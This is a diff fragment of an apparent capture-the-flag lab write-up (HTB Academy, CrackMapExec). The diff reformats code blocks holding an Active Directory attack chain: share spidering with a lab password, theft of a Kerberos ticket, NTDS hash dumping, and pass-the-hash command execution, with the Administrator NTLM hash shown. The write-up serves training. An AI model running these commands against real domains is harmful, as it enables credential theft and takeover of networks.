+```
 
 
 We've found a user – 'nick'.
@@ -2846,8 +2841,8 @@ We have now the credentials 'nick:ASU934as0-dm23asd!'. Lets see to what
 shares he can access in 'DC01':
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u nick -p
-```
 'ASU934as0-dm23asd!' --shares
+```
 
 ![Figure 83.1 — Lab execution and output verification (Page 83)](/assets/images/posts/htb-academy/using-crackmapexec/p083_01.jpg)
 *_Figure 83.1 — Lab execution and output verification (Page 83)_*
@@ -2863,16 +2858,16 @@ sudo proxychains -q crackmapexec smb 172.16.15.3 -u nick -p
 there:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u nick -p
-```
 'ASU934as0-dm23asd!' --spider Ccache --pattern flag
+```
 
 
 
 Here is the flag, right in the share. Lets download it:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u nick -p
-```
 'ASU934as0-dm23asd!' --share Ccache --get-file flag.txt
+```
 flag.txt
 
 
@@ -2903,8 +2898,8 @@ lets begin by take a look once again to the 'Cache' share using 'nick'
 user. maybe there is some Kerberos ticket lying in there:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u nick -p
-```
 'ASU934as0-dm23asd!' --spider Ccache --pattern ccache
+```
 
 
 There is a ticket, belonging to the service user 'svc_inlaneadm'.
@@ -2912,8 +2907,8 @@ Lets download it, and load it to our environment variable 'KRB5CCNAME' so we
 can use 'svc_inlaneadm' account:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u nick -p
-```
 'ASU934as0-dm23asd!' --share Ccache --get-file
+```
 svc_inlaneadm@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL
 @INLANEFREIGHT.LOCAL.ccaches
 svc_inlaneadm@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL
@@ -2942,9 +2937,8 @@ authentication.
 We can use 'svc_inlaneadm' to dump the ntds content, and get the NTLM
 hashes of the various users of the domain, including the Administrator:
 ```bash
-sudo proxychains -q crackmapexec smb 172.16.15.3 --use-
+sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache --ntds
 ```
-kcache --ntds
 
 
 The marked part is the NTLM hash of the administrator –
@@ -2952,9 +2946,8 @@ The marked part is the NTLM hash of the administrator –
 
 *we can also dump a specific for 'Administrator':
 ```bash
-sudo proxychains -q crackmapexec smb 172.16.15.3 --use-
+sudo proxychains -q crackmapexec smb 172.16.15.3 --use-kcache --ntds --user 'Administrator'
 ```
-kcache --ntds --user 'Administrator'
 
 
 *
@@ -2973,9 +2966,9 @@ Lets use pass the hash on the Administrator user to obtain the flag, using smb
 command execution:
 ```bash
 sudo proxychains -q crackmapexec smb 172.16.15.3 -u
-```
 Administrator -H '935f8a2f4fc9ec7b45c54a1044c74c08' -x 'type
 C:\Users\Administrator\Desktop\flag.txt'
+```
 
 
 
